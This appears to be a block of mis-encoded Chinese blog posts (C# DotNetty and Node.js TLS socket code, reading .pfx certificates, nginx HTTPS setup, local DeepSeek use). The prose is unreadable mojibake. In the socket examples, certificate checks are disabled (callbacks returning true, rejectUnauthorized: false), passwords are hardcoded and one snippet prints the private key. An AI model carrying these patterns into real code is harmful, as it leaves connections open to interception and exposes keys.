æ–‡ä»¶çš„ç›®å½•å…·æœ‰å†™å…¥æƒé™ã€‚å¦¥å–„ä¿ç®¡ .pfx æ–‡ä»¶å’Œå¯†ç ï¼Œå› ä¸º .pfx æ–‡ä»¶åŒ…å«ç§é’¥ï¼Œæ³„éœ²ç§é’¥ä¼šå¸¦æ¥å®‰å…¨é£é™©ã€‚ è¯»å–123456789101112131415161718192021222324252627282930313233343536373839404142using System;using System.Security.Cryptography.X509Certificates;class Program&#123; static void Main() &#123; try &#123; // .pfx è¯ä¹¦æ–‡ä»¶çš„è·¯å¾„ string pfxFilePath = &quot;MyCertificate.pfx&quot;; // .pfx è¯ä¹¦æ–‡ä»¶çš„å¯†ç  string pfxPassword = &quot;MyPassword123&quot;; // è¯»å– .pfx è¯ä¹¦æ–‡ä»¶ using (X509Certificate2 certificate = new X509Certificate2(pfxFilePath, pfxPassword)) &#123; // è¾“å‡ºè¯ä¹¦çš„åŸºæœ¬ä¿¡æ¯ Console.WriteLine(&quot;è¯ä¹¦ä¿¡æ¯ï¼š&quot;); Console.WriteLine($&quot;ä¸»é¢˜: &#123;certificate.Subject&#125;&quot;); Console.WriteLine($&quot;é¢å‘è€…: &#123;certificate.Issuer&#125;&quot;); Console.WriteLine($&quot;æœ‰æ•ˆæœŸå¼€å§‹æ—¶é—´: &#123;certificate.NotBefore&#125;&quot;); Console.WriteLine($&quot;æœ‰æ•ˆæœŸç»“æŸæ—¶é—´: &#123;certificate.NotAfter&#125;&quot;); Console.WriteLine($&quot;æŒ‡çº¹: &#123;certificate.Thumbprint&#125;&quot;); // æ£€æŸ¥è¯ä¹¦æ˜¯å¦åŒ…å«ç§é’¥ if (certificate.HasPrivateKey) &#123; Console.WriteLine(&quot;è¯ä¹¦åŒ…å«ç§é’¥ã€‚&quot;); &#125; else &#123; Console.WriteLine(&quot;è¯ä¹¦ä¸åŒ…å«ç§é’¥ã€‚&quot;); &#125; &#125; &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;è¯»å–è¯ä¹¦æ—¶å‡ºé”™: &#123;ex.Message&#125;&quot;); &#125; &#125;&#125; socket sslDotNettySocket æœåŠ¡ç«¯ä»£ç çš„åŸºç¡€ä¸Šæ·»åŠ  SSL&#x2F;TLS åŠ å¯†æ”¯æŒã€‚DotNetty æ”¯æŒ SSL&#x2F;TLSï¼Œå¯ä»¥ä½¿ç”¨ TlsHandler æ¥å®ç°ã€‚éœ€è¦åšä»¥ä¸‹ä¿®æ”¹ï¼š å‡†å¤‡ SSL è¯ä¹¦ï¼ˆ.pfx æ–‡ä»¶ï¼‰ã€‚åœ¨ TcpSocketServerBuilder é‡Œæ·»åŠ  SSL å¤„ç†å™¨ã€‚ç¡®ä¿å®¢æˆ·ç«¯ä¹Ÿæ”¯æŒ SSL è¿æ¥ï¼Œå¦åˆ™è¿æ¥ä¼šå¤±è´¥ã€‚ä¿®æ”¹ TcpSocketServerBuilder ä»£ç åœ¨ ChildHandler çš„ ActionChannelInitializer é‡Œæ·»åŠ  TlsHandlerï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š 1234567891011121314151617using System.Security.Cryptography.X509Certificates;using DotNetty.Handlers.Tls;public ITcpSocketServerBuilder UseSsl(string certPath, string certPassword)&#123; _setEncoder += x =&gt; &#123; var certificate = new X509Certificate2(certPath, certPassword); x.AddFirst(&quot;tls&quot;, new TlsHandler( stream =&gt; new SslStream(stream, true), new ServerTlsSettings(certificate) )); &#125;; return this;&#125; ä¿®æ”¹ Main é‡Œçš„ SocketBuilderFactoryåœ¨ BuildAsync() ä¹‹å‰è°ƒç”¨ UseSslï¼š 123456789var theServer = await SocketBuilderFactory.GetTcpSocketServerBuilder(6001) .UseSsl(&quot;server.pfx&quot;, &quot;yourpassword&quot;) // æ·»åŠ  SSL æ”¯æŒ .SetLengthFieldEncoder(2) .SetLengthFieldDecoder(ushort.MaxValue, 0, 2, 0, 2) .OnConnectionClose((server, connection) =&gt; &#123; //... &#125;).BuildAsync(); è¯´æ˜ï¼šUseSsl(â€œserver.pfxâ€, â€œyourpasswordâ€) éœ€è¦çš„è¯ä¹¦æ–‡ä»¶ server.pfx å’Œå¯†ç ã€‚TlsHandler å¤„ç† SSL&#x2F;TLS è¿æ¥ã€‚å®¢æˆ·ç«¯ä¹Ÿéœ€è¦å¯¹åº”çš„ SSL å¤„ç†ï¼Œå¦åˆ™æ— æ³•è¿æ¥ã€‚è¿™æ ·ï¼ŒæœåŠ¡ç«¯å°±æ”¯æŒ SSL åŠ å¯†äº†ï¼Œå®¢æˆ·ç«¯éœ€è¦ä½¿ç”¨ SslStream è¿›è¡ŒåŠ å¯†è¿æ¥ã€‚å¦‚æœçš„å®¢æˆ·ç«¯ä¹Ÿæ˜¯åŸºäº DotNettyï¼Œéœ€è¦åœ¨ TcpSocketClientBuilder é‡Œæ·»åŠ  TlsHandlerï¼Œæ–¹å¼ç±»ä¼¼ã€‚ node socket client123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354const tls = require(&#x27;tls&#x27;);const fs = require(&#x27;fs&#x27;);const CERT_PATH = &#x27;C:/path/to/MyCertificate.pfx&#x27;;const CERT_PASS = &#x27;your_password&#x27;;const options = &#123; pfx: fs.readFileSync(CERT_PATH), passphrase: CERT_PASS, rejectUnauthorized: false, // å…è®¸è‡ªç­¾åè¯ä¹¦&#125;;const client = tls.connect(6001, &#x27;127.0.0.1&#x27;, options, () =&gt; &#123; console.log(&#x27;âœ… å·²è¿æ¥åˆ°æœåŠ¡å™¨&#x27;); sendData();&#125;);// ç›‘å¬æœåŠ¡å™¨æ•°æ®client.on(&#x27;data&#x27;, (data) =&gt; &#123; console.log(&#x27;ğŸ“© æ”¶åˆ°æœåŠ¡å™¨æ•°æ®:&#x27;, data.toString());&#125;);// ç›‘å¬é”™è¯¯client.on(&#x27;error&#x27;, (err) =&gt; &#123; console.error(&#x27;âŒ è¿æ¥é”™è¯¯:&#x27;, err.message);&#125;);// ç›‘å¬å…³é—­client.on(&#x27;end&#x27;, () =&gt; &#123; console.log(&#x27;ğŸ”´ è¿æ¥å·²æ–­å¼€&#x27;);&#125;);// **å°è£…å‡½æ•°ï¼Œç¡®ä¿æ•°æ®æ ¼å¼æ­£ç¡®**function sendData() &#123; setInterval(() =&gt; &#123; if (client.writable) &#123; const message = `â¡ï¸ å‘é€æ•°æ®: $&#123;new Date().toISOString()&#125;`; const msgBuffer = Buffer.from(message, &#x27;utf-8&#x27;); // **å‰ä¸¤ä¸ªå­—èŠ‚å­˜å‚¨æ¶ˆæ¯é•¿åº¦** const lengthBuffer = Buffer.alloc(2); lengthBuffer.writeUInt16BE(msgBuffer.length, 0); // **æ‹¼æ¥é•¿åº¦å­—æ®µ + æ•°æ®** const finalBuffer = Buffer.concat([lengthBuffer, msgBuffer]); console.log(&#x27;ğŸ“¤ å‘é€æ•°æ®:&#x27;, message); client.write(finalBuffer); &#125; else &#123; console.log(&#x27;âš ï¸ è¿æ¥å·²å…³é—­ï¼Œæ— æ³•å‘é€æ•°æ®&#x27;); &#125; &#125;, 1000);&#125; socket server123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566using Coldairarrow.DotNettySocket;using DotNetty.Handlers.Tls;using System;using System.IO;using System.Net;using System.Security.Cryptography.X509Certificates;using System.Text;using System.Threading.Tasks;namespace TcpSocket.Server&#123; class Program &#123; static async Task Main(string[] args) &#123; // åŠ è½½è¯ä¹¦ var serverCertificate = new X509Certificate2(Path.Combine(AppContext.BaseDirectory, &quot;your_certificate.pfx&quot;), &quot;your_password&quot;); var theServer = await SocketBuilderFactory.GetTcpSocketServerBuilder(6001) .SetLengthFieldEncoder(2) .SetLengthFieldDecoder(ushort.MaxValue, 0, 2, 0, 2) .SetSslHandler(serverCertificate) // æ·»åŠ  SSL å¤„ç†å™¨ .OnConnectionClose((server, connection) =&gt; &#123; Console.WriteLine($&quot;è¿æ¥å…³é—­,è¿æ¥å[&#123;connection.ConnectionName&#125;],å½“å‰è¿æ¥æ•°:&#123;server.GetConnectionCount()&#125;&quot;); &#125;) .OnException(ex =&gt; &#123; Console.WriteLine($&quot;æœåŠ¡ç«¯å¼‚å¸¸:&#123;ex.Message&#125;&quot;); &#125;) .OnNewConnection((server, connection) =&gt; &#123; connection.ConnectionName = $&quot;åå­—&#123;connection.ConnectionId&#125;&quot;; Console.WriteLine($&quot;æ–°çš„è¿æ¥[&#123;connection.ClientAddress.Address.MapToIPv4().ToString()&#125;]:&#123;connection.ConnectionName&#125;,å½“å‰è¿æ¥æ•°:&#123;server.GetConnectionCount()&#125;&quot;); &#125;) .OnRecieve((server, connection, bytes) =&gt; &#123; Console.WriteLine($&quot;æœåŠ¡ç«¯:æ•°æ®&#123;Encoding.UTF8.GetString(bytes)&#125;&quot;); connection.Send(bytes); &#125;) .OnSend((server, connection, bytes) =&gt; &#123; Console.WriteLine($&quot;å‘è¿æ¥å[&#123;connection.ConnectionName&#125;]å‘é€æ•°æ®:&#123;Encoding.UTF8.GetString(bytes)&#125;&quot;); &#125;) .OnServerStarted(server =&gt; &#123; Console.WriteLine($&quot;æœåŠ¡å¯åŠ¨&quot;); &#125;).BuildAsync(); Console.ReadLine(); &#125; &#125; public static class TcpSocketServerBuilderExtensions &#123; public static ITcpSocketServerBuilder SetSslHandler(this ITcpSocketServerBuilder builder, X509Certificate2 serverCertificate) &#123; var tcpBuilder = builder as TcpSocketServerBuilder; tcpBuilder._setEncoder += x =&gt; &#123; x.AddLast(&quot;tls&quot;, new TlsHandler(stream =&gt; new System.Net.Security.SslStream(stream, true, (sender, receivedCertificate, chain, errors) =&gt; true), new DotNetty.Handlers.Tls.ServerTlsSettings(serverCertificate))); &#125;; return builder; &#125; &#125;&#125; socket client1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071using Coldairarrow.DotNettySocket;using DotNetty.Handlers.Tls;using System;using System.IO;using System.Net.Security;using System.Security.Cryptography.X509Certificates;using System.Text;using System.Threading.Tasks;namespace TcpSocket.Client&#123; class Program &#123; static async Task Main(string[] args) &#123; // åŠ è½½å®¢æˆ·ç«¯è¯ä¹¦ var clientCertificate = new X509Certificate2(Path.Combine(AppContext.BaseDirectory, &quot;your_certificate.pfx&quot;), &quot;your_password&quot;); var theClient = await SocketBuilderFactory.GetTcpSocketClientBuilder(&quot;127.0.0.1&quot;, 6001) .SetLengthFieldEncoder(2) .SetLengthFieldDecoder(ushort.MaxValue, 0, 2, 0, 2) .SetSslHandler(clientCertificate) // æ·»åŠ  SSL å¤„ç†å™¨å¹¶ä¼ å…¥å®¢æˆ·ç«¯è¯ä¹¦ .OnClientStarted(client =&gt; &#123; Console.WriteLine($&quot;å®¢æˆ·ç«¯å¯åŠ¨&quot;); &#125;) .OnClientClose(client =&gt; &#123; Console.WriteLine($&quot;å®¢æˆ·ç«¯å…³é—­&quot;); &#125;) .OnException(ex =&gt; &#123; Console.WriteLine($&quot;å¼‚å¸¸:&#123;ex.Message&#125;&quot;); &#125;) .OnRecieve((client, bytes) =&gt; &#123; Console.WriteLine($&quot;å®¢æˆ·ç«¯:æ”¶åˆ°æ•°æ®:&#123;Encoding.UTF8.GetString(bytes)&#125;&quot;); &#125;) .OnSend((client, bytes) =&gt; &#123; Console.WriteLine($&quot;å®¢æˆ·ç«¯:å‘é€æ•°æ®:&#123;Encoding.UTF8.GetString(bytes)&#125;&quot;); &#125;) .BuildAsync(); while (true) &#123; await theClient.Send(Guid.NewGuid().ToString()); await Task.Delay(1000); &#125; &#125; &#125; public static class TcpSocketClientBuilderExtensions &#123; public static ITcpSocketClientBuilder SetSslHandler(this ITcpSocketClientBuilder builder, X509Certificate2 clientCertificate) &#123; var tcpBuilder = builder as TcpSocketClientBuilder; tcpBuilder._setEncoder += x =&gt; &#123; var clientTlsSettings = new DotNetty.Handlers.Tls.ClientTlsSettings(&quot;localhost&quot;, new[] &#123; clientCertificate &#125;); x.AddLast(&quot;tls&quot;, new TlsHandler(stream =&gt; new System.Net.Security.SslStream(stream, true, (sender, receivedCertificate, chain, errors) =&gt; &#123; // è¿™é‡Œå¯ä»¥æ·»åŠ æ›´ä¸¥æ ¼çš„è¯ä¹¦éªŒè¯é€»è¾‘ return true; &#125;), clientTlsSettings)); &#125;; return builder; &#125; &#125;&#125; æ³¨æ„ AddLast or x.AddFirst(â€œtlsâ€nodejs clint1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859const tls = require(&#x27;tls&#x27;);const fs = require(&#x27;fs&#x27;);// æœåŠ¡å™¨åœ°å€å’Œç«¯å£const SERVER_HOST = &#x27;127.0.0.1&#x27;; // æœåŠ¡å™¨ IP åœ°å€const SERVER_PORT = 6001; // æœåŠ¡å™¨ç«¯å£// è¯»å– .pfx è¯ä¹¦const options = &#123; pfx: fs.readFileSync(&#x27;MyCertificate.pfx&#x27;), // çš„ PFX è¯ä¹¦æ–‡ä»¶ passphrase: &#x27;MyPassword123&#x27;, // è¯ä¹¦å¯†ç ï¼Œå’ŒæœåŠ¡ç«¯ä¸€è‡´ rejectUnauthorized: false // å…è®¸è‡ªç­¾åè¯ä¹¦ï¼ˆç”Ÿäº§ç¯å¢ƒå»ºè®®æä¾› CA è¯ä¹¦ï¼‰&#125;;// åˆ›å»º TLS è¿æ¥const client = tls.connect(SERVER_PORT, SERVER_HOST, options, () =&gt; &#123; console.log(&#x27;âœ… æˆåŠŸè¿æ¥åˆ°æœåŠ¡å™¨&#x27;); // å‘é€æµ‹è¯•æ¶ˆæ¯ sendMessage(&#x27;Hello from Node.js TLS Client&#x27;);&#125;);// ç›‘å¬æ•°æ®æ¥æ”¶client.on(&#x27;data&#x27;, (data) =&gt; &#123; console.log(`ğŸ“© æ”¶åˆ°æœåŠ¡å™¨æ¶ˆæ¯: $&#123;data.toString()&#125;`);&#125;);// ç›‘å¬é”™è¯¯client.on(&#x27;error&#x27;, (err) =&gt; &#123; console.error(`âŒ è¿æ¥é”™è¯¯: $&#123;err.message&#125;`);&#125;);client.on(&#x27;close&#x27;, () =&gt; &#123; console.log(&#x27;ğŸ”´ è¿æ¥å·²å…³é—­&#x27;);&#125;);// ç›‘å¬è¿æ¥å…³é—­client.on(&#x27;end&#x27;, () =&gt; &#123; console.log(&#x27;ğŸ”´ æœåŠ¡å™¨å·²æ–­å¼€è¿æ¥&#x27;);&#125;);// å‘é€æ¶ˆæ¯æ—¶ï¼ŒåŠ ä¸Š 2 å­—èŠ‚çš„é•¿åº¦å‰ç¼€function sendMessage(message) &#123; const msgBuffer = Buffer.from(message, &#x27;utf-8&#x27;); const lengthBuffer = Buffer.alloc(2); // 2 å­—èŠ‚é•¿åº¦ lengthBuffer.writeUInt16BE(msgBuffer.length, 0); // å¤§ç«¯åºå†™å…¥é•¿åº¦ const finalBuffer = Buffer.concat([lengthBuffer, msgBuffer]); // æ‹¼æ¥é•¿åº¦å’Œæ¶ˆæ¯ client.write(finalBuffer);&#125;// client.setTimeout(5000); // è®¾ç½®è¶…æ—¶ 5 ç§’// client.on(&#x27;timeout&#x27;, () =&gt; &#123;// console.error(&#x27;â³ è¿æ¥è¶…æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½æœªå¯åŠ¨æˆ–ç«¯å£ä¸å¯¹&#x27;);// client.destroy();// &#125;); c# read1234567891011121314151617181920212223242526272829303132333435363738394041424344using System;using System.Security.Cryptography.X509Certificates;class Program&#123; static void Main() &#123; try &#123; // .pfx è¯ä¹¦æ–‡ä»¶çš„è·¯å¾„ string pfxFilePath = &quot;MyCertificate.pfx&quot;; // .pfx è¯ä¹¦æ–‡ä»¶çš„å¯†ç  string pfxPassword = &quot;MyPassword123&quot;; // è¯»å– .pfx è¯ä¹¦æ–‡ä»¶ using (X509Certificate2 certificate = new X509Certificate2(pfxFilePath, pfxPassword)) &#123; // è¾“å‡ºè¯ä¹¦çš„åŸºæœ¬ä¿¡æ¯ Console.WriteLine(&quot;è¯ä¹¦ä¿¡æ¯ï¼š&quot;); Console.WriteLine($&quot;ä¸»é¢˜: &#123;certificate.Subject&#125;&quot;); Console.WriteLine($&quot;é¢å‘è€…: &#123;certificate.Issuer&#125;&quot;); Console.WriteLine($&quot;æœ‰æ•ˆæœŸå¼€å§‹æ—¶é—´: &#123;certificate.NotBefore&#125;&quot;); Console.WriteLine($&quot;æœ‰æ•ˆæœŸç»“æŸæ—¶é—´: &#123;certificate.NotAfter&#125;&quot;); Console.WriteLine($&quot;æŒ‡çº¹: &#123;certificate.Thumbprint&#125;&quot;); // æ£€æŸ¥è¯ä¹¦æ˜¯å¦åŒ…å«ç§é’¥ if (certificate.HasPrivateKey) &#123; Console.WriteLine(&quot;è¯ä¹¦åŒ…å«ç§é’¥ã€‚&quot;); &#125; else &#123; Console.WriteLine(&quot;è¯ä¹¦ä¸åŒ…å«ç§é’¥ã€‚&quot;); &#125; &#125; &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;è¯»å–è¯ä¹¦æ—¶å‡ºé”™: &#123;ex.Message&#125;&quot;); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435//å…¶ä»–ä¿¡æ¯ Console.WriteLine($&quot;è¯ä¹¦ç‰ˆæœ¬: &#123;certificate.Version&#125;&quot;); Console.WriteLine($&quot;è¯ä¹¦åºåˆ—å·: &#123;certificate.SerialNumber&#125;&quot;); Console.WriteLine($&quot;å…¬é’¥: &#123;certificate.PublicKey.Key.ToXmlString(false)&#125;&quot;); Console.WriteLine($&quot;è¯ä¹¦æŒ‡çº¹: &#123;certificate.Thumbprint&#125;&quot;); using (X509Certificate2 certificate = new X509Certificate2(pfxFilePath, pfxPassword)) &#123; foreach (X509Extension extension in certificate.Extensions) &#123; if (extension.Oid.FriendlyName == &quot;Subject Alternative Name&quot;) &#123; X509SubjectAlternativeNameExtension sanExtension = (X509SubjectAlternativeNameExtension)extension; Console.WriteLine(&quot;ä¸»é¢˜å¤‡ç”¨åç§°æ‰©å±•ä¿¡æ¯:&quot;); foreach (string name in sanExtension.Format(true).Split(new[] &#123; Environment.NewLine &#125;, StringSplitOptions.RemoveEmptyEntries)) &#123; Console.WriteLine(name); &#125; &#125; &#125; &#125; //ç§é’¥ if (certificate.HasPrivateKey) &#123; Console.WriteLine(&quot;è¯ä¹¦åŒ…å«ç§é’¥ã€‚&quot;); // è¿™é‡Œå‡è®¾ç§é’¥æ˜¯ RSA ç±»å‹ if (certificate.PrivateKey is RSACryptoServiceProvider rsa) &#123; Console.WriteLine($&quot;ç§é’¥ä¿¡æ¯: &#123;rsa.ToXmlString(true)&#125;&quot;); &#125; &#125; else &#123; Console.WriteLine(&quot;è¯ä¹¦ä¸åŒ…å«ç§é’¥ã€‚&quot;); &#125; END","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"c#","slug":"c","permalink":"https://banjinmei.github.io/tags/c/"},{"name":"socket","slug":"socket","permalink":"https://banjinmei.github.io/tags/socket/"},{"name":"ssl","slug":"ssl","permalink":"https://banjinmei.github.io/tags/ssl/"}],"author":"mu"},{"title":"free https ssl","slug":"free-https-ssl","date":"2025-02-12T17:09:12.000Z","updated":"2025-02-12T17:10:17.869Z","comments":true,"path":"2025/02/13/free-https-ssl/","permalink":"https://banjinmei.github.io/2025/02/13/free-https-ssl/","excerpt":"","text":"ç”³è¯·è¯ä¹¦ï¼ˆ1ï¼‰ç”³è¯·è¯ä¹¦ä¹‹å‰ï¼Œéœ€è¦å‡†å¤‡å¥½ç”¨äºç»‘å®šè¯ä¹¦çš„åŸŸåï¼ˆå‡å¦‚æ‚¨çš„åŸŸåæ˜¯ï¼šabc.dm.comï¼‰ã€‚è¿™ä¸ªåŸŸåå¿…é¡»èƒ½å¤Ÿæ­£å¸¸è®¿é—®ï¼Œä¹Ÿå°±æ˜¯è¯´é€šè¿‡æµè§ˆå™¨å¯ä»¥æ­£å¸¸è®¿é—®ï¼šhttp://abc.dm.com ã€‚ ï¼ˆ2ï¼‰æ‰“å¼€ç½‘ç«™ï¼š æ¥æ­¤åŠ å¯† - Letâ€™s Encrypt åœ¨çº¿å…è´¹ç”³è¯·SSLè¯ä¹¦ https://letsencrypt.osfipin.com/ ï¼ˆ3ï¼‰ç‚¹â€œç«‹å³å¼€å§‹â€ï¼Œæ³¨å†Œç”¨æˆ·ã€‚ï¼ˆå¦‚æœå·²æ³¨å†Œç”¨æˆ·ï¼Œç›´æ¥ç‚¹â€œç™»å½•â€ï¼‰ ï¼ˆ4ï¼‰ç™»å½•ä¹‹åï¼Œé€‰æ‹©â€œç”³è¯·è¯ä¹¦â€ï¼Œä¹‹åç…§ç€ç”³è¯·è¯ä¹¦çš„æŒ‡å¼•ï¼Œä¸€æ­¥æ­¥å®Œæˆè¯ä¹¦çš„ç”³è¯·ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç›´æ¥æŒ‰ç…§é»˜è®¤çš„é€‰é¡¹ç”³è¯·å°±è¡Œã€‚ ï¼ˆ5ï¼‰æäº¤ç”³è¯·æˆåŠŸä¹‹åï¼Œè¿˜è¦è¿›è¡Œä¸€æ¬¡æ‰‹å·¥éªŒè¯ã€‚éªŒè¯æ–¹å¼å»ºè®®é€‰æ‹©DNSéªŒè¯ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ï¼ˆ6ï¼‰åœ¨æ‚¨çš„åŸŸåç®¡ç†ç½‘ç«™ï¼Œæ ¹æ®ç³»ç»Ÿæç¤ºçš„DNSéªŒè¯èµ„æ–™ï¼Œæ·»åŠ ä¸€æ¡TXTåŸŸåè§£æè®°å½•ï¼Œå®Œæˆä¹‹åï¼Œç‚¹å‡»éªŒè¯ã€‚ç­‰å¾…éªŒè¯é€šè¿‡ä¹‹åè¯ä¹¦å°±ç”³è¯·åˆ°æ‰‹å•¦ã€‚ OR HTTPSéªŒè¯ åˆ·æ–°ä¸‹è½½è¯ä¹¦ ä¿®æ”¹nginxé…ç½®123456789101112131415161718192021222324252627282930server &#123; listen 80; # listen [::]:80; server_name test1.xx.xyz; root /var/www/html; index index.html; location / &#123; root html; index index.html index.htm; &#125;&#125;server &#123; listen 443 ssl; server_name test1.xx.xyz; ssl_stapling on; ssl_stapling_verify on; ssl_certificate /var/www/cert/fullchain.crt; ssl_certificate_key /var/www/cert/private.pem; location / &#123; root /var/www/html; index index.html index.htm; &#125; &#125; 1sudo systemctl restart nginx è®¿é—®https å¦‚æœæ­£ç¡®è®¿é—®åˆ™éƒ¨ç½²æˆåŠŸ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"https","slug":"https","permalink":"https://banjinmei.github.io/tags/https/"},{"name":"ssl","slug":"ssl","permalink":"https://banjinmei.github.io/tags/ssl/"},{"name":"nginx","slug":"nginx","permalink":"https://banjinmei.github.io/tags/nginx/"}],"author":"mu"},{"title":"deepseek local deploy","slug":"deepseek-local-deploy","date":"2025-02-05T20:21:55.000Z","updated":"2025-02-12T17:11:09.304Z","comments":true,"path":"2025/02/06/deepseek-local-deploy/","permalink":"https://banjinmei.github.io/2025/02/06/deepseek-local-deploy/","excerpt":"","text":"DeepSeekDeepSeekæ˜¯æ­å·æ·±åº¦æ±‚ç´¢äººå·¥æ™ºèƒ½æŠ€æœ¯æœ‰é™å…¬å¸æ¨å‡ºçš„äººå·¥æ™ºèƒ½é¡¹ç›®ï¼Œæ¶µç›–å…¬å¸å“ç‰Œã€äººå·¥æ™ºèƒ½æ¨¡å‹åŠç›¸å…³ AI å·¥å…·ç­‰å¤šå±‚å«ä¹‰ï¼Œä»¥ä¸‹æ˜¯å…·ä½“ä»‹ç»ï¼šå…¬å¸å±‚é¢DeepSeek æ˜¯ä¸€å®¶ 2023 å¹´ 5 æœˆæˆç«‹çš„ä¸­å›½äººå·¥æ™ºèƒ½å…¬å¸ï¼Œç”±å¯¹å†²åŸºé‡‘å…¬å¸ High-Flyer å‡ºèµ„æˆç«‹ã€‚å…¶åˆ›å§‹äººæ¢æ–‡å³°å¸¦é¢†å›¢é˜Ÿä¸“æ³¨äºäººå·¥æ™ºèƒ½åŸºç¡€æŠ€æœ¯ç ”ç©¶ä¸å¼€å‘ï¼Œåœ¨äººå·¥æ™ºèƒ½é¢†åŸŸå°¤å…¶æ˜¯å¤§è¯­è¨€æ¨¡å‹æ–¹å‘æŠ•å…¥äº†å¤§é‡ç ”ç©¶èµ„æºå¹¶å–å¾—æˆæœã€‚æ¨¡å‹å±‚é¢DeepSeek Coderï¼š2023 å¹´ 11 æœˆ 2 æ—¥å‘å¸ƒï¼Œæ˜¯å®Œå…¨å¼€æºä¸”å¯å…è´¹ç”¨äºå•†ä¸šç”¨é€”çš„æ¨¡å‹ï¼Œä¸ºå¼€å‘è€…æä¾›äº†åŸºç¡€çš„ä»£ç ç”Ÿæˆç­‰èƒ½åŠ›æ”¯æŒã€‚DeepSeek LLMï¼š2023 å¹´ 11 æœˆ 29 æ—¥æ¨å‡ºï¼Œå…·æœ‰ 670 äº¿å‚æ•°ï¼Œæ€§èƒ½ä¸å½“æ—¶çš„ GPT-4 æ¥è¿‘ï¼ŒåŒæ—¶æ¨å‡ºäº†èŠå¤©ç‰ˆæœ¬ DeepSeek Chatã€‚DeepSeek V2ï¼š2024 å¹´ 5 æœˆå‘å¸ƒï¼Œä»¥æ€§ä»·æ¯”é«˜è€Œé—»åï¼Œæ¯ç™¾ä¸‡è¾“å‡º tokens ä»…éœ€ 2 å…ƒäººæ°‘å¸ï¼Œåœ¨ LLM æ’åä¸­ä½åˆ—ç¬¬ä¸ƒã€‚DeepSeek R1-lite-previewï¼š2024 å¹´ 11 æœˆå‘å¸ƒï¼Œæ“…é•¿é€»è¾‘æ¨ç†ã€æ•°å­¦æ¨ç†å’Œå®æ—¶é—®é¢˜è§£å†³ï¼Œåœ¨ä¸€äº›åŸºå‡†æµ‹è¯•ä¸­å£°ç§°è¶…è¶Šäº† OpenAI O1ï¼Œä½†ä¹Ÿæœ‰æµ‹è¯•æ˜¾ç¤ºå­˜åœ¨é€Ÿåº¦ç­‰æ–¹é¢çš„æŒ‘æˆ˜ã€‚DeepSeek V3ï¼š2024 å¹´ 12 æœˆå‘å¸ƒï¼Œæ‹¥æœ‰ 6710 äº¿å‚æ•°ï¼Œè®­ç»ƒä»…èŠ±è´¹ 558 ä¸‡ç¾å…ƒï¼Œçº¦ 55 å¤©æ—¶é—´ï¼Œåœ¨åŸºå‡†æµ‹è¯•ä¸­æ€§èƒ½ä¼˜äº Llama 3.1 å’Œ Qwen 2.5ï¼Œä¸ GPT-4 O å’Œ Claude 3.5 Sonnet ç›¸å½“ã€‚DeepSeek R1 å’Œ DeepSeek R1-zeroï¼š2025 å¹´ 1 æœˆå‘å¸ƒï¼ŒR1 æ¨¡å‹æ˜¯å¼€æºçš„ï¼Œå¯è®©ä»»ä½•å¼€å‘è€…ä½¿ç”¨ï¼Œåœ¨ä¸€äº›å…³é”®çš„æ•°å­¦å’Œç¼–ç¨‹æµ‹è¯•ä¸­è¡¨ç°å‡ºè‰²ï¼Œèƒ½ä¸ OpenAI çš„å…ˆè¿›æ¨¡å‹ç›¸åª²ç¾æˆ–è¶…è¶Šã€‚å·¥å…·å±‚é¢DeepSeek ä½œä¸º AI å·¥å…·ï¼Œå…·æœ‰å¼ºå¤§çš„è‡ªç„¶è¯­è¨€å¤„ç†èƒ½åŠ›ï¼Œå¯è¿›è¡ŒçŸ¥è¯†é—®ç­”ã€æ–‡æœ¬ç”Ÿæˆã€æ•°æ®åˆ†æã€ä»£ç ç¼–å†™ç­‰å¤šç§ä»»åŠ¡ï¼Œè¿˜æ”¯æŒå¤šæ¨¡æ€è¾“å…¥å’Œè”ç½‘æœç´¢ï¼Œèƒ½å®æ—¶è·å–æœ€æ–°ä¿¡æ¯ã€‚å¹¿æ³›åº”ç”¨äºæ•™è‚²ã€ç¼–ç¨‹ã€å†…å®¹åˆ›ä½œã€æ™ºèƒ½å®¢æœç­‰é¢†åŸŸï¼Œä¸ºç”¨æˆ·æä¾›é«˜æ•ˆã€æ™ºèƒ½çš„è§£å†³æ–¹æ¡ˆã€‚ DeepSeekçš„å®˜æ–¹ç½‘ç«™åœ°å€ https://www.deepseek.com/APP https://download.deepseek.com/app/WebUI https://chat.deepseek.com/APIæ–‡æ¡£ https://api-docs.deepseek.com/zh-cn/ æœåŠ¡çŠ¶æ€ https://status.deepseek.com/ æœ¬åœ°è¿è¡Œ1ollama run deepseek-r1 or 1ollama run deepseek-r1:1.5b 1234curl http://localhost:11434/api/generate -d &#x27;&#123; &quot;model&quot;: &quot;deepseek-r1:1.5b&quot;, &quot;prompt&quot;: &quot;Why is the sky blue?&quot;&#125;&#x27; https://github.com/ollama/ollama/blob/main/docs/api.md python12345678910111213141516171819python# Please install OpenAI SDK first: `pip3 install openai`from openai import OpenAIclient = OpenAI(api_key=&quot;&lt;DeepSeek API Key&gt;&quot;, base_url=&quot;https://api.deepseek.com&quot;)response = client.chat.completions.create( model=&quot;deepseek-chat&quot;, messages=[ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello&quot;&#125;, ], stream=False)print(response.choices[0].message.content) æ³¨æ„model&#x3D;â€™deepseek-chatâ€™è°ƒç”¨çš„æ˜¯DeepSeek-V3æ¨¡å‹ï¼Œmodel&#x3D;â€™deepseek-reasonerâ€™æ‰æ˜¯DeepSeek-R1å¤§æ¨¡å‹ã€‚ 